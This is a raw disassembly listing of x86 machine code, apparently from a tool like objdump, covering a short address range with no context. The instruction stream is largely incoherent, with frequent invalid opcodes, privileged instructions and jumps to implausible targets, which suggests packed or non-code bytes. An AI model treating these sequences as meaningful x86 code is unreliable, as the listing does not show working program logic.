  419dab:	mov    DWORD PTR [ebx+0x3b03ba08],ecx
  419db1:	inc    ebp
  419db2:	add    BYTE PTR [esi+0x2b],ah
  419db5:	or     bh,BYTE PTR [edx+0xf8ac2]
  419dbb:	cmp    al,0x33
  419dbd:	mov    edi,DWORD PTR [edx+0xfc4e81]
  419dc3:	(bad)  
  419dc4:	cmp    esi,DWORD PTR [ebx]
  419dc6:	je     0x419d80
  419dc8:	push   ebx
  419dc9:	dec    esi
  419dca:	str    ecx
  419dcd:	cmp    esp,DWORD PTR [ebp+esi*2-0x33]
  419dd1:	xor    edi,DWORD PTR [edi+0x789085f]
  419dd7:	mov    edx,DWORD PTR [esp+edi*8]
  419dda:	add    cl,cl
  419ddc:	data16 add al,0xcb
  419ddf:	push   ebp
  419de0:	add    ebp,esp
  419de2:	jne    0x419dd0
  419de4:	(bad)  
  419de5:	mov    DWORD PTR [ecx],0xd685f7ec
  419deb:	clc    
  419dec:	xlat   BYTE PTR ds:[ebx]
  419ded:	inc    ebp
  419dee:	mov    esi,DWORD PTR [eax]
  419df0:	push   eax
  419df1:	pushf  
  419df2:	in     eax,0x8b
  419df4:	add    ah,ch
  419df6:	add    al,0x55
  419df8:	add    BYTE PTR [ecx+0x66],dl
  419dfb:	add    eax,0x3e72cb
  419e00:	add    BYTE PTR [ebp+0x66],al
  419e03:	(bad)  
  419e04:	retf   
  419e05:	lock ret 0x85
  419e09:	clc    
  419e0a:	inc    bp
  419e0c:	retf   
  419e0d:	cmp    eax,0xc77d9cc8
  419e12:	ss cld 
  419e14:	pushf  
  419e15:	test   DWORD PTR [edi-0x8],ebx
  419e18:	je     0x419e5f
  419e1a:	xor    esi,DWORD PTR ds:0x7020840
  419e20:	ror    BYTE PTR [ebp-0x37],0x8d
  419e24:	push   ebp
  419e25:	add    esp,ebp
  419e27:	jb     0x419db4
  419e29:	add    BYTE PTR [eax],cl
  419e2b:	dec    ebp
  419e2c:	mov    bh,0x81
  419e2e:	push   esi
  419e2f:	push   ebp
  419e30:	adc    DWORD PTR [ecx-0x3c],0x3e9cff81
  419e37:	xor    al,BYTE PTR [eax]
  419e39:	mov    edx,DWORD PTR [edi+0x10]
  419e3c:	(bad)  
  419e3d:	scas   eax,DWORD PTR es:[edi]
  419e3e:	ret    0x3b
  419e41:	jns    0x3b429b34
  419e47:	mov    esi,DWORD PTR [eax+edx*1-0x75]
  419e4b:	dec    ebp
  419e4c:	or     BYTE PTR [ebx],ch
  419e4e:	ret    0x458b
  419e51:	lock jmp 0x419e45
  419e54:	mov    ecx,DWORD PTR [eax]
  419e56:	or     BYTE PTR [edi],al
  419e58:	mov    ecx,eax
  419e5a:	xor    DWORD PTR [edx+0x2],0x0
  419e5e:	mov    bh,0xc1
  419e60:	adc    BYTE PTR [eax],dh
  419e62:	iret   
  419e63:	inc    ebp
  419e64:	mov    DWORD PTR [ebx],0x4dfff8c4
  419e6a:	inc    BYTE PTR [ebx]
  419e6c:	ret    0xf8
  419e6f:	adc    DWORD PTR [esi+0x10],esp
  419e72:	clc    
  419e73:	dec    ecx
  419e74:	fisttp WORD PTR [ecx+0x456604c0]
  419e7a:	add    dh,BYTE PTR ds:0x75e0845
  419e80:	ret    0x4d
  419e83:	lea    ecx,[ebx+0x18728301]
  419e89:	add    BYTE PTR [ebp+0x45],al
  419e8c:	xor    ecx,ebp
  419e8e:	pushf  
  419e8f:	add    bh,al
  419e91:	add    al,ch
  419e93:	inc    ebp
  419e94:	test   DWORD PTR [ebx-0x3eba0708],ecx
  419e9a:	xor    eax,0x781084d
  419e9f:	push   ebp
  419ea0:	pushf  
  419ea1:	push   ecx
  419ea2:	xor    al,BYTE PTR [ecx+0x32f89c89]
  419ea8:	inc    ebp
  419ea9:	cmp    edi,DWORD PTR [ecx]
  419eab:	jbe    0x419e49
  419ead:	mov    eax,edi
  419eaf:	or     ah,dh
  419eb1:	inc    ebp
  419eb2:	test   DWORD PTR [ebx+0x4d450cf8],ecx
  419eb8:	xor    ecx,DWORD PTR [ebx-0x74747664]
  419ebe:	in     al,dx
  419ebf:	hlt    
  419ec0:	push   ebp
  419ec1:	push   ebp
  419ec2:	push   ecx
  419ec3:	push   ecx
  419ec4:	mov    ecx,DWORD PTR [ebx-0x7b7b0708]
  419eca:	pushf  
  419ecb:	pushf  
  419ecc:	xor    dh,BYTE PTR [edx]
  419ece:	mov    ecx,DWORD PTR [ecx+0x5bf1f8e8]
  419ed4:	or     BYTE PTR [ebp+0x7],al
  419ed7:	mov    eax,ecx
  419ed9:	clc    
  419eda:	jb     0x419e9d
  419edc:	add    BYTE PTR [ebp+0x55],cl
  419edf:	or     DWORD PTR [edi],0xc251d155
  419ee5:	add    DWORD PTR [ebx+0x32009c],0x8b76453b
  419eef:	mov    edi,eax
  419ef1:	or     cl,al
  419ef3:	inc    ebp
  419ef4:	dec    ebp
  419ef5:	mov    eax,DWORD PTR [ecx+0x514d550c]
  419efb:	or     WORD PTR [ecx],0x899c
  419f00:	xor    cl,BYTE PTR [ebx+0x5576fc3b]
  419f06:	mov    edx,DWORD PTR [ecx+0x8]
  419f09:	mov    eax,DWORD PTR [ebp-0x8]
  419f0c:	mov    eax,DWORD PTR [esp+ecx*1-0x74cdb264]
  419f13:	mov    DWORD PTR [ecx+0x4178bf8],ecx
  419f19:	inc    ebp
  419f1a:	dec    eax
  419f1b:	add    ecx,DWORD PTR [ebx+0x554df0f8]
  419f21:	add    edx,DWORD PTR [ecx-0x8]
  419f24:	mov    ecx,DWORD PTR [ecx]
  419f26:	clc    
  419f27:	or     BYTE PTR [ebp+eax*2+0x4532409c],al
  419f2e:	mov    ecx,ebp
  419f30:	clc    
  419f31:	(bad)  
  419f32:	popf   
  419f33:	inc    DWORD PTR [eax]
  419f35:	ret    0x8b
  419f38:	adc    BYTE PTR [ebx-0x38d4aeb3],cl
  419f3e:	mov    edi,esp
  419f40:	hlt    
  419f41:	test   ecx,esi
  419f43:	clc    
  419f44:	or     BYTE PTR [ebp+0x7],al
  419f47:	xor    cl,al
  419f49:	pushf  
  419f4a:	jb     0x419f7f
  419f4c:	add    BYTE PTR [eax-0x3f],al
  419f4f:	inc    eax
  419f50:	daa    
  419f51:	inc    ebp
  419f52:	inc    ebp
  419f53:	xor    eax,0x7f80803
  419f58:	dec    ebp
  419f59:	pushf  
  419f5a:	add    esi,DWORD PTR [edx]
  419f5c:	clc    
  419f5d:	cmp    DWORD PTR [ecx],ecx
  419f5f:	or     al,0x8
  419f61:	add    al,BYTE PTR [ebp+0x2c]
  419f64:	xor    eax,0x7350845
  419f69:	or     BYTE PTR [ebp+0x7],cl
  419f6c:	lea    ebx,[ecx+eax*1+0x8b7232]
  419f73:	or     al,0x45
  419f75:	enter  0x4deb,0x8b
  419f79:	mov    edx,DWORD PTR [eax]
  419f7b:	cld    
  419f7c:	dec    ebp
  419f7d:	push   ebp
  419f7e:	sub    edx,DWORD PTR [ecx-0x75]
  419f81:	add    eax,0xf172fc
  419f86:	or     BYTE PTR [ebp+0x7],cl
  419f89:	add    eax,ecx
  419f8b:	or     al,0x72
  419f8d:	add    DWORD PTR [eax],eax
  419f8f:	mov    ebx,0x29c2c1
  419f94:	inc    ebp
  419f95:	mov    eax,DWORD PTR [ebx]
  419f97:	cmp    eax,0x3004d1c
  419f9d:	xbegin 0x66c72b97
  419fa3:	clc    
  419fa4:	or     BYTE PTR [ebp+0x45],al
  419fa7:	xor    BYTE PTR ds:0x78b089c,dh
  419fad:	adc    BYTE PTR [ebp+0x45],cl
  419fb0:	lea    eax,[ebp+0x33727501]
  419fb6:	add    cl,ch
  419fb8:	inc    ebp
  419fb9:	add    bl,ch
  419fbb:	add    BYTE PTR [ebx+0x45850845],cl
  419fc1:	je     0x419f4e
  419fc3:	push   ebx
  419fc4:	or     al,0x85
  419fc6:	dec    ebp
  419fc7:	std    
  419fc8:	mov    bh,bh
  419fca:	mov    BYTE PTR [ebp-0x75],al
  419fcd:	mov    edi,eax
  419fcf:	or     al,0x89
  419fd1:	inc    ebp
  419fd2:	clc    
  419fd3:	mov    esp,esp
  419fd5:	hlt    
  419fd6:	call   DWORD PTR [edi-0x37]
  419fd9:	push   ebp
  419fda:	or     al,0x51
  419fdc:	push   ebp
  419fdd:	xor    ebp,esp
  419fdf:	mov    esi,0x457251
  419fe4:	xor    esi,eax
  419fe6:	pushf  
  419fe7:	inc    ebp
  419fe8:	(bad)  
  419fe9:	mov    edi,eax
  419feb:	or     al,0x85
  419fed:	add    al,bh
  419fef:	inc    eax
  419ff1:	mov    esi,DWORD PTR [ebx+ecx*4-0x75]
  419ff5:	or     ah,bh
  419ff7:	inc    eax
  419ff8:	push   ebp
  419ff9:	jmp    0x41a04c
  419ffb:	mov    eax,DWORD PTR ds:0xe8720c
  41a001:	mov    DWORD PTR [ebp-0x8],eax
  41a004:	jne    0x41a04b
  41a006:	jmp    0x419f93
  41a008:	mov    ebp,DWORD PTR [eax]
  41a00a:	clc    
  41a00b:	retf   0xff55
  41a00e:	push   ecx
  41a00f:	mov    DWORD PTR ds:0x757210,eax
  41a015:	mov    ecx,DWORD PTR [ebp-0x4]
  41a018:	sub    esp,DWORD PTR [ebx-0x77]
  41a01b:	dec    DWORD PTR [eax*4-0x74ca8abb]
  41a022:	or     ah,bh
  41a024:	pop    es
  41a025:	ds pushf 
  41a027:	push   DWORD PTR [edx]
  41a029:	mov    ecx,DWORD PTR [ebx+0x4dc708f0]
  41a02f:	(bad)  
  41a030:	mov    bh,bh
  41a032:	jmp    0x41a020
  41a034:	leave  
  41a035:	jne    0x41a03f
  41a037:	call   0x2e9991
  41a03c:	in     al,dx
  41a03d:	dec    ebp
  41a03e:	add    dh,BYTE PTR [ebx]
  41a040:	add    BYTE PTR [ebx],al
  41a042:	inc    ebp
  41a043:	cmp    esi,DWORD PTR [ecx]
  41a045:	je     0x419fe3
  41a047:	mov    eax,edi
  41a049:	or     al,0xf0
  41a04b:	add    BYTE PTR [ebp+0x458bf845],al
  41a051:	or     BYTE PTR [ebx-0x3f7cf7b3],cl
  41a057:	adc    al,0x7
  41a059:	enter  0x9fc0,0xa5
  41a05d:	rol    BYTE PTR [eax],0x5e
  41a060:	mov    ecx,ecx
  41a062:	or     al,0xc
  41a064:	ror    BYTE PTR [ebx+0x408df8f2],0xe4
  41a06b:	jmp    0x41a06c
  41a06d:	push   ebp
  41a06e:	mov    esp,ebp
  41a070:	cld    
  41a071:	inc    ebp
  41a072:	inc    ebp
  41a073:	or     DWORD PTR [ecx+0x457dec10],0x0
  41a07a:	push   esi
  41a07b:	push   esi
  41a07c:	mov    edi,0x7af080f
  41a081:	add    bh,al
  41a083:	test   DWORD PTR [edi+ecx*1+0x3a732],ebx
  41a08a:	mov    DWORD PTR [edi],ecx
  41a08c:	adc    BYTE PTR [eax+0x45],al
  41a08f:	mov    ebp,eax
  41a091:	mov    ebp,edi
  41a093:	lock call edx
  41a096:	fcom   DWORD PTR [ebp+0x45]
  41a099:	mov    eax,0x148a8b
  41a09e:	push   ecx
  41a09f:	enter  0xc145,0x83
  41a0a3:	cmp    ecx,DWORD PTR [eax]
  41a0a5:	add    BYTE PTR [ebp+0x4d],al
  41a0a8:	mov    eax,DWORD PTR [ebx+0x3340fcf8]
  41a0ae:	call   0xffa19c1d
  41a0b3:	cmp    eax,DWORD PTR [ebp-0xc]
  41a0b6:	jmp    DWORD PTR [eax+edx*1-0x4e]
  41a0ba:	push   ebp
  41a0bb:	(bad)  
  41a0bc:	call   0x329ec0
  41a0c1:	mov    bh,0xdb
  41a0c3:	cld    
  41a0c4:	or     BYTE PTR [ebp+0x45],bl
  41a0c7:	(bad)  
  41a0c8:	call   0xff7b9d58
  41a0cd:	add    al,BYTE PTR [ebp+0x37]
  41a0d0:	xor    esi,DWORD PTR [edi+0x4e50bf03]
  41a0d6:	jne    0x41a0d8
  41a0d8:	(bad)  
  41a0d9:	cmp    edi,esp
  41a0db:	jne    0x41a10e
  41a0dd:	mov    edi,edi
  41a0df:	or     BYTE PTR [ebx-0x307f0b49],cl
  41a0e5:	pop    ds
  41a0e6:	into   
  41a0e7:	je     0x41a0aa
  41a0e9:	mov    ebx,DWORD PTR [esi]
  41a0eb:	or     BYTE PTR [ebp-0x49],al
  41a0ee:	mov    esp,DWORD PTR [esi-0x77]
  41a0f1:	mov    esi,0x4451f0c
  41a0f6:	mov    eax,DWORD PTR [eax]
  41a0f8:	or     al,0x66
  41a0fa:	sar    bl,0x3b
  41a0fd:	xor    esi,DWORD PTR [ebp+0x66]
  41a100:	xor    ecx,edi
  41a102:	pop    edi
  41a103:	adc    bl,BYTE PTR [ebx+0x70]
  41a106:	ret    0xff
  41a109:	cld    
  41a10a:	inc    ebp
  41a10b:	mov    ecx,DWORD PTR [ebx-0xec6e70c]
  41a111:	cld    
  41a112:	mov    ebp,DWORD PTR [ebx+ecx*4-0x13baf3fa]
  41a119:	push   0xffffff83
  41a11b:	pop    edi
  41a11c:	or     BYTE PTR [ebp+0x53],dh
  41a11f:	xorps  xmm1,xmm2
  41a122:	test   BYTE PTR [eax+eax*1],bh
  41a125:	add    BYTE PTR [eax],al
  41a127:	adc    eax,eax
  41a129:	add    DWORD PTR [eax+esi*2-0xff7b00],0xffffffb7
  41a131:	jmp    DWORD PTR [eax]
  41a133:	ror    al,0x5e
  41a136:	inc    ebp
  41a137:	leave  
  41a138:	xor    ecx,DWORD PTR [eax]
  41a13a:	and    DWORD PTR [ebx-0x3ec10708],ecx
  41a140:	add    ah,al
  41a142:	xor    edi,edi
  41a144:	xor    DWORD PTR [ebx],0x66003304
  41a14a:	mov    DWORD PTR [ebp-0xc],ecx
  41a14d:	pcmpgtw mm0,mm0
  41a150:	add    dl,ah
  41a152:	leave  
  41a153:	mov    edi,DWORD PTR [esi-0x7d]
  41a156:	push   ax
  41a158:	dec    ebp
  41a159:	mov    esi,DWORD PTR [ebx-0x75]
  41a15c:	lea    ebp,[eax-0x7c00ff04]
  41a162:	xor    eax,DWORD PTR [eax]
  41a164:	sysret 
  41a166:	dec    ebp
  41a167:	ror    BYTE PTR [ebx+0xc000c30],0x6a
  41a16e:	push   WORD PTR [ecx+0x8]
  41a172:	jne    0x41a135
  41a174:	ud0    ecx,DWORD PTR [ecx]
  41a177:	mov    eax,edx
  41a179:	lods   al,BYTE PTR ds:[esi]
  41a17a:	add    BYTE PTR [eax],al
  41a17c:	data16 (bad) 
  41a17e:	iret   
  41a17f:	and    cl,BYTE PTR [eax*2+0x440f8d5d]
  41a186:	cli    
  41a187:	inc    ebp
  41a188:	cmp    al,0x8d
  41a18a:	add    BYTE PTR [esi+0x2d],ah
  41a18d:	inc    ebp
  41a18e:	pop    ebp
  41a18f:	lea    ecx,[edi]
  41a191:	mov    dl,bh
  41a193:	add    BYTE PTR [edi],cl
  41a195:	mov    DWORD PTR [eax+eax*8],edi
  41a198:	mov    ebx,0x3b87
  41a19d:	add    BYTE PTR [ebx],ch
  41a19f:	inc    ebp
  41a1a0:	data16 (bad) 
  41a1a2:	clc    
  41a1a3:	int3   
  41a1a4:	cmp    eax,DWORD PTR [eax]
  41a1a6:	je     0x41a131
  41a1a8:	push   0xffffffc8
  41a1aa:	pop    edi
  41a1ab:	xchg   DWORD PTR [ebp+0x0],eax
  41a1ae:	data16 add BYTE PTR [ebp+0x45],cl
  41a1b2:	lea    cx,[ebp+0x10]
  41a1b6:	jb     0x41a1b8
  41a1b8:	jmp    0x41a143
  41a1ba:	call   eax
  41a1bc:	clc    
  41a1bd:	xchg   DWORD PTR [edi+0x1],edi
  41a1c0:	mov    eax,DWORD PTR [eax]
  41a1c2:	or     BYTE PTR [ebp-0x49],al
  41a1c5:	lea    eax,[eax+0x74003154]
  41a1cb:	push   edi
  41a1cc:	inc    edx
  41a1cd:	jge    0x41a1ce
  41a1cf:	mov    DWORD PTR [edi],ecx
  41a1d1:	fdiv   DWORD PTR [edi-0x6]
  41a1d4:	inc    DWORD PTR [eax]
  41a1d6:	xor    edx,DWORD PTR [eax+0x5f]
  41a1d9:	xchg   DWORD PTR [ebx+0x1],ebx
  41a1dc:	ret    0x0
  41a1df:	xor    BYTE PTR [ebp-0x51],cl
  41a1e2:	cmp    edi,0xf0ff89fc
  41a1e8:	data16 ror al,0x84
  41a1ec:	rol    BYTE PTR [eax],0x3b
  41a1ef:	add    al,dh
  41a1f1:	dec    eax
  41a1f2:	xchg   esp,eax
  41a1f3:	push   ebx
  41a1f4:	jmp    0x41a181
  41a1f6:	push   ebp
  41a1f7:	add    esp,ebp
  41a1f9:	add    ebp,esp
  41a1fb:	mov    edx,DWORD PTR [edi+0x24]
  41a1fe:	clc    
  41a1ff:	dec    esi
  41a200:	xchg   DWORD PTR [ebx+0x5e002001],ecx
  41a206:	cmp    BYTE PTR [ebx],al
  41a208:	jne    0x41a193
  41a20a:	xor    esp,eax
  41a20c:	jmp    0x44a38f
  41a211:	add    ebp,DWORD PTR [ecx+ecx*4]
  41a214:	jne    0x41a20a
  41a216:	call   0xffcb9f70
  41a21b:	clc    
  41a21c:	xchg   edi,eax
  41a21d:	sti    
  41a21e:	add    DWORD PTR [ebx],eax
  41a220:	add    BYTE PTR [ebp+0x47],bl
  41a223:	xor    ecx,DWORD PTR [ecx+0x47e8b489]
  41a229:	pop    ebp
  41a22a:	mov    DWORD PTR [esi-0x48],esi
  41a22d:	jmp    0x41a276
  41a22f:	mov    ecx,DWORD PTR [ecx-0x7882431c]
  41a235:	(bad)  
  41a237:	cmp    al,0x0
  41a239:	cmp    eax,DWORD PTR [ebp+0x18]
  41a23c:	lea    ebx,[ebp-0x56]
  41a23f:	jle    0x41a241
  41a241:	jae    0x41a1cc
  41a243:	mov    eax,esp
  41a245:	call   0xb900:0x8b005587
  41a24c:	inc    ebp
  41a24d:	push   ebp
  41a24e:	lea    ecx,[ebp-0x27ff4f12]
  41a254:	mov    eax,edi
  41a256:	int3   
  41a257:	push   ebp
  41a258:	xchg   edi,eax
  41a25a:	add    esp,ebp
  41a25c:	add    BYTE PTR [eax],al
  41a25e:	inc    ebp
  41a25f:	add    BYTE PTR [ebp+0x8b3255],cl
  41a265:	cld    
  41a266:	mov    DWORD PTR [edx],edi
  41a268:	aam    0x75
  41a26a:	xchg   DWORD PTR [ebx+0x3400dc01],ecx
  41a270:	mov    DWORD PTR [ebx-0x50],edx
  41a273:	test   BYTE PTR [ebp-0x1],0xe8
  41a277:	mov    eax,DWORD PTR [eax]
  41a279:	hlt    
  41a27a:	add    al,al
  41a27c:	mov    eax,DWORD PTR ds:0x890045a8
  41a282:	dec    DWORD PTR [ebx+0x45fdf0e8]
  41a288:	inc    DWORD PTR [eax*2+0xf75854d]
  41a28f:	mov    ebp,DWORD PTR [ebp-0x7476ff18]
  41a295:	call   0x7297ffd6
  41a29a:	je     0x41a2fa
  41a29c:	js     0x41a2fd
  41a29e:	lock ret 0x7e
  41a2a2:	mov    ecx,DWORD PTR [ebx+0x8568b1c]
  41a2a8:	mov    edi,edi
  41a2aa:	sbb    al,bl
  41a2ac:	clc    
  41a2ad:	add    BYTE PTR [ebp-0x73],bh
  41a2b0:	mov    ebx,DWORD PTR [eax-0x7437ffec]
  41a2b6:	ror    BYTE PTR [eax],1
  41a2b8:	dec    ebp
  41a2b9:	xchg   ebp,eax
  41a2ba:	mov    edi,edi
  41a2bc:	in     al,0x8b
  41a2be:	jge    0x41a249
  41a2c0:	cmp    ecx,DWORD PTR [ebx+0x39893377]
  41a2c6:	clc    
  41a2c7:	pop    esi
  41a2c8:	fist   DWORD PTR [ebp+0x5d398b5d]
  41a2ce:	clc    
  41a2cf:	add    al,0x6e
  41a2d1:	mov    eax,DWORD PTR [ebx]
  41a2d3:	mov    BYTE PTR [ebp+0x0],dl
  41a2d6:	mov    edx,DWORD PTR [ebx-0x20]
  41a2d9:	adc    esi,DWORD PTR [edi+0x5e005f3e]
  41a2df:	add    eax,0x3b3b73
  41a2e4:	adc    al,0x89
  41a2e6:	pop    eax
  41a2e7:	sbb    DWORD PTR [edx+eax*1],0xffffff8b
  41a2eb:	ret    0xf08
  41a2ee:	cmp    al,0x2
  41a2f0:	mov    edx,eax
  41a2f2:	cld    
  41a2f3:	add    BYTE PTR [ebp+0x66],dl
  41a2f6:	add    eax,ebx
  41a2f8:	add    esp,eax
  41a2fa:	sub    eax,eax
  41a2fc:	or     BYTE PTR [ecx-0x77f474bb],cl
  41a302:	add    BYTE PTR [eax],al
  41a304:	mov    DWORD PTR [ebx-0x24],ebx
  41a307:	push   edi
  41a308:	push   ebp
  41a309:	clc    
  41a30a:	add    DWORD PTR [esi+0x1b0100],0x45
  41a311:	out    0xff,eax
  41a313:	add    edx,DWORD PTR [eax]
  41a315:	jmp    0x41a2ff
  41a317:	cmp    ch,0x47
  41a31a:	(bad)  
  41a31b:	jmp    0x40c72b6d
  41a320:	je     0x41a2ac
  41a322:	mov    eax,DWORD PTR [eax-0x10c78f04]
  41a328:	inc    ebp
  41a329:	add    BYTE PTR [ebx-0x770375],al
  41a32f:	add    ah,ch
  41a331:	add    edx,esp
  41a333:	pop    edi
  41a334:	pop    ebp
  41a335:	push   ebp
  41a336:	inc    ebx
  41a337:	in     al,dx
  41a338:	pop    ebp
  41a339:	in     al,dx
  41a33a:	cmp    edx,DWORD PTR [edi-0x8]
  41a33d:	xor    DWORD PTR [esp+ebx*4-0x173676a5],edx
  41a344:	add    al,0x47
  41a346:	push   ebp
  41a347:	mov    esp,ebp
  41a349:	in     al,0x45
  41a34b:	dec    ebp
  41a34c:	push   esi
  41a34d:	test   DWORD PTR [eax+0xfb010f],esi
  41a353:	add    BYTE PTR [eax+0xc018b],dh
  41a359:	leave  
  41a35a:	inc    ebp
  41a35b:	test   al,ch
  41a35d:	add    dh,bh
  41a35f:	add    bh,bh
  41a361:	dec    ebp
  41a362:	push   cs
  41a363:	mov    DWORD PTR [ecx],eax
  41a365:	hlt    
  41a366:	push   es
  41a367:	dec    ebp
  41a368:	leave  
  41a369:	mov    DWORD PTR [eax],ecx
  41a36b:	clc    
  41a36c:	cmovge eax,ecx
  41a36f:	mov    ecx,0x85c2f0
  41a375:	clc    
  41a376:	pop    DWORD PTR [ebp+0x1]
  41a379:	push   ebx
  41a37a:	add    BYTE PTR [ebp-0x15],bh
  41a37d:	push   esi
  41a37e:	xor    eax,0x898a45
  41a383:	cld    
  41a384:	add    al,0x45
  41a386:	add    BYTE PTR [ebx],dh
  41a388:	pushfw 
  41a38a:	add    DWORD PTR [esi+0x78308c1],edi
  41a390:	add    ah,BYTE PTR [edi+esi*4-0x33]
  41a394:	mov    ebx,0xc4e8b
  41a399:	(bad)  
  41a39a:	cmp    ecx,ebx
  41a39c:	jne    0x41a366
  41a39e:	xor    ecx,DWORD PTR [ebp+0x66]
  41a3a1:	jmp    0xc8a3a7
  41a3a6:	add    DWORD PTR [ebp+0x0],eax
  41a3a9:	mov    eax,ebx
  41a3ab:	or     al,0x8b
  41a3ad:	(bad)  
  41a3ae:	mov    ecx,esi
  41a3b0:	mov    BYTE PTR [eax+eax*1+0x664c138],cl
  41a3b7:	mov    eax,edi
  41a3b9:	or     BYTE PTR [edx],cl
  41a3bb:	shl    cl,cl
  41a3bd:	icebp  
  41a3be:	add    BYTE PTR [ebp+0x37],0x8b
  41a3c2:	or     BYTE PTR [edx+eax*2],cl
  41a3c5:	(bad)  
  41a3c6:	or     cl,dh
  41a3c8:	stc    
  41a3c9:	shl    DWORD PTR [ebp-0x30],0xc6
  41a3cd:	xor    al,0x0
  41a3cf:	inc    ebp
  41a3d0:	xchg   BYTE PTR [ebx],al
  41a3d2:	add    esp,edi
  41a3d4:	add    BYTE PTR [ebp-0x39],cl
  41a3d7:	mov    al,bl
  41a3d9:	test   DWORD PTR [ebx+0x1c348375],ecx
  41a3df:	sub    al,0xbf
  41a3e1:	jmp    0x41a368
  41a3e3:	mov    edi,eax
  41a3e5:	lock jge 0x41a3d9
  41a3e8:	lea    esi,[edx-0x74bad501]
  41a3ee:	mov    ebp,esp
  41a3f0:	or     cl,dh
  41a3f2:	leave  
  41a3f3:	add    al,BYTE PTR [eax+eax*4-0x37ff9c00]
  41a3fa:	dec    ebp
  41a3fb:	dec    ebp
  41a3fc:	test   DWORD PTR [ebx],eax
  41a3fe:	paddb  mm6,mm0
  41a401:	add    DWORD PTR [eax],eax
  41a403:	dec    ebp
  41a404:	mov    ecx,DWORD PTR [ebx-0x63b217f0]
  41a40a:	mov    esi,DWORD PTR [edx]
  41a40c:	or     al,0x2b
  41a40e:	dec    ebp
  41a40f:	xor    ecx,DWORD PTR [ebx+0x4575083b]
  41a415:	mov    esp,esi
  41a417:	adc    BYTE PTR [ebp+edx*2+0x33ec3389],bl
  41a41e:	mov    DWORD PTR [ebx],ebp
  41a420:	call   0xc752d50
  41a425:	mov    DWORD PTR [ebp+0x10],ecx
  41a428:	(bad)  
  41a429:	push   0x8b85ff10
  41a42e:	clc    
  41a42f:	or     al,0x55
  41a431:	(bad)  
  41a432:	push   ecx
  41a433:	retf   
  41a434:	mov    ebx,0xff4d8dc8
  41a439:	mov    DWORD PTR [ebp+0x8],eax
  41a43c:	xor    eax,DWORD PTR [ebp-0x75]
  41a43f:	cmp    ebp,DWORD PTR [ebx]
  41a441:	lsl    ebx,WORD PTR [edi-0x8]
  41a445:	call   DWORD PTR [ebx-0x741bff75]
  41a44b:	(bad)  
  41a44c:	or     al,0x5b
  41a44e:	dec    ebp
  41a44f:	or     BYTE PTR [ebx],dh
  41a451:	inc    ebp
  41a452:	xor    esi,DWORD PTR ds:0x708088d
  41a458:	in     eax,0x9c
  41a45a:	add    BYTE PTR [edx],dh
  41a45c:	inc    ebp
  41a45d:	pop    edi
  41a45e:	xor    eax,edx
  41a460:	test   DWORD PTR [eax],0x83108b8b
  41a466:	dec    ebp
  41a467:	adc    al,0x33
  41a469:	inc    ebp
  41a46a:	xor    esi,DWORD PTR [ecx]
  41a46c:	sub    ebx,DWORD PTR [ebx+edi*1-0x74038a39]
  41a473:	test   DWORD PTR [eax],ecx
  41a475:	clc    
  41a476:	inc    ebp
  41a477:	add    ecx,DWORD PTR [ebx+0xc7f445]
  41a47d:	hlt    
  41a47e:	leave  
  41a47f:	test   DWORD PTR [esi],eax
  41a481:	clc    
  41a482:	inc    edi
  41a483:	push   edi
  41a484:	aaa    
  41a485:	inc    ebp
  41a486:	pop    ss
  41a487:	ror    DWORD PTR [ebp-0x29],1
  41a48a:	or     BYTE PTR [ebx+0x4d64fc55],0xd1
  41a491:	mov    eax,0x780084d
  41a496:	push   ebp
  41a497:	clc    
  41a498:	ret    0xe99c
  41a49b:	xor    dl,dl
  41a49d:	xor    ecx,DWORD PTR [ebx+0x4d030803]
  41a4a3:	js     0x88830a2
  41a4a9:	dec    ebp
  41a4aa:	push   ebp
  41a4ab:	mov    edi,DWORD PTR [eax+0xc872fc]
  41a4b1:	lock enter 0xceca,0xf2
  41a4b6:	retf   0x18ce
  41a4b9:	jne    0x41a508
  41a4bb:	mov    ecx,DWORD PTR [ebx-0x31eaf304]
  41a4c1:	enter  0xf0d6,0xca
  41a4c5:	retf   0xf2c8
  41a4c8:	into   
  41a4c9:	out    dx,al
  41a4ca:	dec    ebp
  41a4cb:	dec    ebp
  41a4cc:	jmp    0xff45a404
  41a4d1:	xor    eax,DWORD PTR [ebp-0x15]
  41a4d4:	xor    esi,DWORD PTR [ebx]
  41a4d6:	mov    esi,DWORD PTR [ebx]
  41a4d8:	sub    eax,DWORD PTR [ebx]
  41a4da:	add    eax,DWORD PTR [ebx]
  41a4dc:	or     bl,dl
  41a4de:	dec    ebp
  41a4df:	mov    DWORD PTR [ebx-0x38b2ef08],ecx
  41a4e5:	xor    eax,DWORD PTR [ebp-0xf00073]
  41a4eb:	jb     0x41a532
  41a4ed:	add    BYTE PTR [ebx],dh
  41a4ef:	dec    ebp
  41a4f0:	pop    esi
  41a4f1:	mov    ebp,ebx
  41a4f3:	cld    
  41a4f4:	mov    esi,eax
  41a4f6:	call   0x520ffac3
  41a4fb:	stc    
  41a4fc:	add    eax,0x4572aa
  41a501:	pop    edi
  41a502:	leave  
  41a503:	add    ecx,DWORD PTR [eax*2-0x3c13a1ab]
  41a50a:	in     al,dx
  41a50b:	mov    eax,edi
  41a50d:	xor    eax,0xf8008520
  41a513:	mov    DWORD PTR [ebp-0x14],0xf89c8530
  41a51a:	mov    eax,DWORD PTR [ebp-0x77]
  41a51d:	xor    al,bh
  41a51f:	pushf  
  41a520:	inc    ebp
  41a521:	(bad)  
  41a522:	cmp    eax,ebp
  41a524:	pushf  
  41a525:	xchg   BYTE PTR [esi-0x8],dl
  41a528:	mov    edi,0x8518e4ec
  41a52e:	jmp    0xf056:0x8b457df8
  41a535:	push   ebp
  41a536:	push   ebp
  41a537:	push   ecx
  41a538:	push   ecx
  41a539:	push   edi
  41a53a:	xor    eax,esi
  41a53c:	mov    edx,0x32729c
  41a541:	add    ecx,eax
  41a543:	mov    edx,edi
  41a545:	clc    
  41a546:	retf   0xaf45
  41a549:	cmp    ebx,ebp
  41a54b:	pushf  
  41a54c:	mov    eax,edi
  41a54e:	clc    
  41a54f:	cld    
  41a550:	jne    0x41a56a
  41a552:	xor    ebp,edx
  41a554:	xor    eax,DWORD PTR [ebp+0x3]
  41a557:	or     BYTE PTR [ebx],al
  41a559:	add    BYTE PTR [ebp-0x7747475],al
  41a55f:	hlt    
  41a560:	dec    ebp
  41a561:	dec    ebp
  41a562:	je     0x41a597
  41a564:	xor    esi,DWORD PTR [ebx]
  41a566:	xor    eax,DWORD PTR [ebx]
  41a568:	add    eax,DWORD PTR [ebx]
  41a56a:	add    ecx,DWORD PTR [edi]
  41a56c:	rol    ecx,cl
  41a56e:	mov    esi,DWORD PTR [ecx]
  41a570:	in     al,dx
